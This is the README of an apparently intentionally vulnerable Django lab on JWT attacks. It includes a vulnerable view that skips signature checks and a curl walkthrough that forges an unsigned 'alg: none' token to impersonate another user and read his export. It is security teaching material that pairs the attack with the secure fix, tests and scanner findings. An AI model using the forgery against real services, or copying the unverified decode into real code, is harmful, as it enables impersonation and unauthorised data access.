# Lab 16 — JWT Attacks

Companion lab for the blog post
**[JWT Attacks: Why Blacklisting the Refresh Token Doesn't Log Anyone Out](https://thiagoteixeira.tech/blog/jwt-attacks-why-blacklisting-the-refresh-token-doesnt-log-anyone-out/)**.

| | |
|---|---|
| **OWASP** | A07:2025 — Authentication Failures |
| **CWE** | CWE-347 — Improper Verification of Cryptographic Signature |
| **ASVS** | 5.0.0 V9.1.1 — self-contained tokens are validated using their signature or MAC before their contents are accepted · V9.1.2 — only allowlisted algorithms, never `none` · V9.2.1 — `exp` is verified · V9.2.2 — the token is the correct type for its purpose |
| **Detection** | **The standard tools catch it.** Semgrep's curated packs flag the unverified decode on the vulnerable view (`unverified-jwt-decode`) and stay silent on the secure one, asserted in CI; no custom rule. Bandit ships no JWT check and is silent on both views. Neither tool has a rule about simplejwt's settings. See [`scans/`](scans/) |

> ⚠️ Intentionally vulnerable. Run locally / in the provided Docker stack only. See [SECURITY.md](../../SECURITY.md).

## The whole vulnerability is one option

```python
# views_vulnerable.py — reads the claims, never the signature
claims = jwt.decode(token, options={"verify_signature": False})
user = User.objects.get(pk=claims["user_id"])

# views_secure.py — DRF authenticates the request; the view reads request.user
class ExportView(APIView):
    authentication_classes = [JWTAuthentication]
    permission_classes = [IsAuthenticated]
```

The vulnerable view is what an old tutorial turns into on PyJWT 2. `jwt.decode(token,
verify=False)` used to return a token's claims unchecked; on PyJWT 2 the `verify`
argument does nothing, the call fails asking for `algorithms`, and PyJWT's own
deprecation warning names the replacement, `options={"verify_signature": False}`.
That runs, and it believes any payload anyone writes: a token with `"alg": "none"`
and no signature, or a genuine token whose payload was edited after it was issued.

The secure view does not decode anything itself. `JWTAuthentication` checks the
signature with the project's key and a one-element `algorithms` list, then the token
type, `exp`, that the user still exists and is active, and (with
`CHECK_REVOKE_TOKEN` on) that their password has not changed since the token was
issued. A forged token never reaches the view body.

## The cast

`alice` is the attacker, `bob` the victim. Both use the shared lab password `labpass`
and can get real tokens from `/jwt/token/`. bob's export holds the flag. alice never
learns bob's password: all she needs is his user id, which the seed log prints.

## Run it

From the repository root (the folder with `docker-compose.yml`):

```bash
docker compose up -d --build     # Postgres + Django, migrated and seeded, on 127.0.0.1:8000
docker compose logs web | grep "jwt:"
# web-1  | jwt: seeded alice (attacker, user_id 1) + bob (victim, user_id 2) — bob's export holds the flag
```

The ids are those of a fresh stack; on a database that other labs seeded first they
can differ, which is why the walkthrough reads bob's from the log rather than
assuming it. The commands below need `bash`, `curl` and `python` on the host.

## Exploit the pair from the command line

```bash
BASE=http://127.0.0.1:8000
BOB=$(docker compose logs web | grep -o 'bob (victim, user_id [0-9]*' | tail -1 | grep -o '[0-9]*$')
echo $BOB
# 2

# 1. alice logs in with her own password and gets a genuine token pair.
curl -s -X POST -d 'username=alice&password=labpass' $BASE/jwt/token/
# {"refresh":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...","access":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
#  (tokens shortened here)

ACCESS=$(curl -s -X POST -d 'username=alice&password=labpass' $BASE/jwt/token/ \
         | python -c "import json,sys; print(json.load(sys.stdin)['access'])")

# 2. Her genuine token gets her own export from the secure view.
curl -s -H "Authorization: Bearer $ACCESS" $BASE/jwt/secure/export/
# <h1>Export</h1><p>alice: 3 invoices, all paid</p>

# 3. Forge a token: alg "none", a payload naming bob, and no signature at all.
#    Nothing secret goes into it — no key, no password.
FORGED=$(python -c "
import base64, json, sys
b = lambda d: base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
print(b({'alg': 'none', 'typ': 'JWT'}) + '.' + b({'user_id': sys.argv[1]}) + '.')
" "$BOB")

# 4. The vulnerable view believes it.
curl -s -H "Authorization: Bearer $FORGED" $BASE/jwt/vulnerable/export/
# <h1>Export</h1><p>bob: payroll export: FLAG{jwt_claims_trusted_without_signature_check}</p>

# 5. The secure view does not.
curl -s -w '\nHTTP %{http_code}\n' -H "Authorization: Bearer $FORGED" $BASE/jwt/secure/export/
# {"detail":"Given token not valid for any token type","code":"token_not_valid","messages":[{"token_class":"AccessToken","token_type":"access","message":"Token is invalid"}]}
# HTTP 401
```

Step 2 is the part worth not skipping: the secure view is not merely refusing people,
it serves alice her own export the moment her token is genuine.

`tests.py` adds three more forgeries the secure view refuses and the vulnerable one
does not: alice's genuine token with its payload edited to name bob, claims the
secure view accepts under the project's key, signed instead with the committed
`SECRET_KEY` (the key simplejwt would sign with by default), and an expired token.

## Logout does not end the access token

The repo also ships the logout endpoint most simplejwt projects write,
[`views_logout.py`](views_logout.py). It is the same in both worlds, because no setting
fixes it:

```bash
PAIR=$(curl -s -X POST -d 'username=alice&password=labpass' $BASE/jwt/token/)
ACCESS=$(echo "$PAIR"  | python -c "import json,sys; print(json.load(sys.stdin)['access'])")
REFRESH=$(echo "$PAIR" | python -c "import json,sys; print(json.load(sys.stdin)['refresh'])")

curl -s -o /dev/null -w 'HTTP %{http_code}\n' -X POST -d "refresh=$REFRESH" \
     -H "Authorization: Bearer $ACCESS" $BASE/jwt/logout/
# HTTP 205

curl -s -H "Authorization: Bearer $ACCESS" $BASE/jwt/secure/export/
# <h1>Export</h1><p>alice: 3 invoices, all paid</p>

curl -s -X POST -d "refresh=$REFRESH" $BASE/jwt/token/refresh/
# {"detail":"Token is blacklisted","code":"token_not_valid"}
```

The refresh token is dead; the access token that made the logout request still works,
and keeps working until its `exp`. `AccessToken` does not inherit simplejwt's
`BlacklistMixin` — only `RefreshToken` and `SlidingToken` do. This project's access
tokens live five minutes, so the window is small, but it is not zero.

## The settings are the other half

simplejwt's defaults sign every token with `SECRET_KEY`, never rotate refresh tokens,
and never revoke on a password change. This project replaces them with one block in
[`config/settings.py`](../../config/settings.py):

```python
SIMPLE_JWT = {
    "SIGNING_KEY": JWT_SIGNING_KEY,                  # not SECRET_KEY
    "ALGORITHM": "HS256",
    "ACCESS_TOKEN_LIFETIME": timedelta(minutes=5),
    "REFRESH_TOKEN_LIFETIME": timedelta(days=1),
    "ROTATE_REFRESH_TOKENS": True,
    "BLACKLIST_AFTER_ROTATION": True,
    "CHECK_REVOKE_TOKEN": True,
}
```

It is a global setting on purpose, against the repo's usual rule (see
[CONTRIBUTING.md](../../CONTRIBUTING.md), "Settings are global; lab behaviour should
not be"): this block *is* the lesson, and no other lab issues a JWT. `JWT_SIGNING_KEY`
comes from the environment, or is drawn at random when the process starts. So tokens
do not survive a restart of `web`: get a fresh pair after `docker compose restart` or
a code change.

`tests.py` asserts both the block and the simplejwt defaults it replaces, so a
release that changes either turns this repo red instead of quietly making the post
wrong.

## Tests

```bash
docker compose run --rm web python manage.py test labs.post_16_jwt
# Ran 14 tests in 4.524s
#
# OK (expected failures=1)
```

`test_an_unsigned_token_naming_bob_reaches_the_flag` and
`test_secure_refuses_the_unsigned_token` are the pair that matters: the same forged
token, served the flag by one view and refused by the other. Serve the secure URL
from the vulnerable view and five tests fail.

The expected failure is `test_logout_ends_the_access_token`. It fails under every
simplejwt configuration, for the reason in the section above, and it is kept as the
most precise statement of what this project accepts: it starts passing the day
someone builds an access-token denylist.

`test_password_change_revokes_access_tokens` is the configuration test worth copying
into your own project: it fails on a default install and passes once
`CHECK_REVOKE_TOKEN` is on.

## Isolation

- **Brute force is out of scope** — `/jwt/token/` is a password form with no throttle. That is Lab 11's class.
- **CSRF does not apply** — the token travels in an `Authorization` header the browser never adds by itself; DRF's views are CSRF-exempt unless they use session authentication. CSRF is Lab 08.
- **This is not IDOR** (Lab 06): the export is always the authenticated user's own; what the attacker forges is *who* the user is. Output is escaped, so it is not XSS (Lab 02).
- **The JWT stack is global but inert elsewhere** — `rest_framework_simplejwt.token_blacklist` adds two tables, and the `SIMPLE_JWT` block only affects code that issues or verifies a JWT. The full suite is green across all 16 labs.

## Scanning it

The write-up is in [`scans/README.md`](scans/README.md). The short version: Semgrep's
curated packs find the bug — `unverified-jwt-decode` fires on
`views_vulnerable.py:35` and is silent on the secure view — so this lab ships no
custom rule, and CI asserts that split. Bandit has no JWT check at all. And the
`SIMPLE_JWT` block, the other half of the lesson, is invisible to Semgrep and
misread by Bandit, which reports the fix's `"CHECK_REVOKE_TOKEN": True` as a
hard-coded password.
